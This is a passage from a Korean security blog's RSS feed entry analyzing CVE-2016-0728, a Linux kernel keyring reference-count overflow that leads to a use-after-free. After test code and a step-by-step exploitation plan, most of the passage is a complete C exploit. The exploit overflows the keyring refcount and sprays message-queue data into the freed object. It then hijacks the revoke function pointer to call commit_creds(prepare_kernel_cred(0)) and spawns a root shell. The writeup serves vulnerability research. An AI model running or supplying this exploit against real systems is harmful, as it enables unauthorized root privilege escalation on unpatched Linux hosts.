keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>먼저 “TestSession”이라는 name의 keyring을 만들고, 다시 한 번 같은 이름의 keyring을 만든다.</li><li>keyctl_join_session_keyring은 find_keyring_by_name를 호출 할 것이며 이를 통해 keyring-&gt;usage는 계속 증가할 것이다.</li><li>keyring의 정보는 /proc/keys에서 확인 할 수 있다.</li></ul><p><img src="https://user-images.githubusercontent.com/70257118/98797011-6165a600-244f-11eb-9955-a46887866a07.png" alt="334"></p><ul><li>위와 같이 “TestSession”의 refcount가 계속 증가하는 것을  확인할 수 있다.</li><li>만약 0xffffffff(2^32)번 만큼 실행을 시킨다면, Integer OverFlow를 통하여 refcount를 0으로 초기화 시킬 수 있을 것이다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>keyctl(KEYCTL_JOIN_SESSION_KEYRING,”TestSession”)을 2^32번 반복한 후, /proc/keys를 확인한다.</li></ul><h2 id="How-to-exploit"><a href="#How-to-exploit" class="headerlink" title="How to exploit?"></a>How to exploit?</h2><ol><li>Key 오브젝트에 대한 정상적인 참조를 가지고 있는다.</li><li>해당 Keyring 오브젝트의 Usage를 Overflow 시킨다.</li><li>Keyring 오브젝트를 free시킨다. </li><li>user space에서 이미 free된 keyring 공간에 새로운 커널 오브젝트를 할당한다.</li><li>이전의 keyring 오브젝트를 참조하게 하여 코드를 실행시킨다.</li></ol><ul><li>exploit의 핵심 함수는 key_revoke()이다.</li></ul><h3 id="key-revoke"><a href="#key-revoke" class="headerlink" title="key_revoke()"></a>key_revoke()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_revoke</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">time64_t</span> time;</span><br><span class="line">key_check(key);</span><br><span class="line"><span class="comment">/* make sure no one&#x27;s trying to change or use the key when we mark it</span></span><br><span class="line"><span class="comment"> * - we tell lockdep that we might nest because we might be revoking an</span></span><br><span class="line"><span class="comment"> *   authorisation key whilst holding the sem on a key we&#x27;ve just</span></span><br><span class="line"><span class="comment"> *   instantiated</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">down_write_nested(&amp;key-&gt;sem, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!test_and_set_bit(KEY_FLAG_REVOKED, &amp;key-&gt;flags) &amp;&amp;</span><br><span class="line">    key-&gt;type-&gt;revoke)</span><br><span class="line">key-&gt;type-&gt;revoke(key); </span><br><span class="line"><span class="comment">/* set the death time to no more than the expiry time */</span></span><br><span class="line">time = ktime_get_real_seconds();</span><br><span class="line"><span class="keyword">if</span> (key-&gt;revoked_at == <span class="number">0</span> || key-&gt;revoked_at &gt; time) &#123;</span><br><span class="line">key-&gt;revoked_at = time;</span><br><span class="line">key_schedule_gc(key-&gt;revoked_at + key_gc_delay);</span><br><span class="line">&#125;</span><br><span class="line">up_write(&amp;key-&gt;sem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>key_revoke()에서 key-&gt;type-&gt;revoke(key)를 호출한다. </li><li>여기서 revoke는 key_type구조체에 있는 멤버이며, 함수 포인터이다.</li><li>즉, revoke를 우리가 원하는 함수의 주소로 덮어쓴 후 호출시킬수 있다.</li><li>revoke부분을 commit_creds(prepare_kernel_cred(0))가 호출되도록 덮어야 한다.</li><li>prepare_kernel_cred(0)을 호출,  root의 권한의 task를 가지고 commit_creds를 실행하기 때문에 현재 프로세스의 권한이 root가 되기 때문이다.</li></ul><h2 id="exploit-method"><a href="#exploit-method" class="headerlink" title="exploit method"></a>exploit method</h2><ul><li>user space에서 가짜 key_type을 만든다.</li><li>key_revoke가 실행될 때 root권한을 얻을 수 있도록 key_type-&gt;revoke에 commit_creds(prepare_kernel_cred(0))주소를 넣는다.</li><li>메세지 큐를 생성하고, 이때 이전에 free된 keyring의 위치가 재사용 된다.</li><li>메세지 큐를 이용해 keyring에 맞게 가짜 key_type을 전달한다.</li><li>keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING)를 호출한다.</li><li>key-&gt;type-&gt;revoke = commit_creds(prepare_kernel_cred(0))가 실행되어 root권한을 획득한다.</li><li>execl(“/bin/sh”, “/bin/sh”, NULL)을 호출하여 쉘을 획득한다.</li></ul><h2 id="exploit-Code"><a href="#exploit-Code" class="headerlink" title="exploit Code"></a>exploit Code</h2><ul><li>최종 exploit code는 다음과 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff81094250)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">size_t</span> datalen;</span><br><span class="line">    <span class="keyword">void</span> * vet_description;</span><br><span class="line">    <span class="keyword">void</span> * preparse;</span><br><span class="line">    <span class="keyword">void</span> * free_preparse;</span><br><span class="line">    <span class="keyword">void</span> * instantiate;</span><br><span class="line">    <span class="keyword">void</span> * update;</span><br><span class="line">    <span class="keyword">void</span> * match_preparse;</span><br><span class="line">    <span class="keyword">void</span> * match_free;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">    <span class="keyword">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *keyring_name;</span><br><span class="line"><span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line"><span class="keyword">char</span> mtext[STRUCT_LEN];</span><br><span class="line">&#125; </span><br><span class="line">    msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> msqid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;usage: ./keys &lt;key_name&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid()); </span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    </span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line"></span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)my_key_type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line"></span><br><span class="line">serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line"><span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Increfing...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished increfing&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;forking...&quot;</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished forking&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;caling revoke...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl_revoke&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/70257118/99533180-d2c1cd80-29e8-11eb-9a4d-35319be58303.png" alt="CVE-2016-0728"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f">https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f</a></li><li><a href="https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/">https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/</a></li><li><a href="https://duasynt.com/blog/cve-2016-0728-poc-not-working">https://duasynt.com/blog/cve-2016-0728-poc-not-working</a></li><li><a href="https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/">https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/</a></li><li><a href="http://egloos.zum.com/rousalome/v/9964885">http://egloos.zum.com/rousalome/v/9964885</a></li><li><a href="https://procdiaru.tistory.com/89">https://procdiaru.tistory.com/89</a></li><li><a href="http://blog.naver.com/skinfosec2000/220612669396">http://blog.naver.com/skinfosec2000/220612669396</a></li><li><a href="https://asiagaming.tistory.com/160">https://asiagaming.tistory.com/160</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://pwnkidhn.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/CVE/">CVE</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Linux-Kernel/">Linux Kernel</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/11/02/2020-11-03-CVE-2016-0728/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
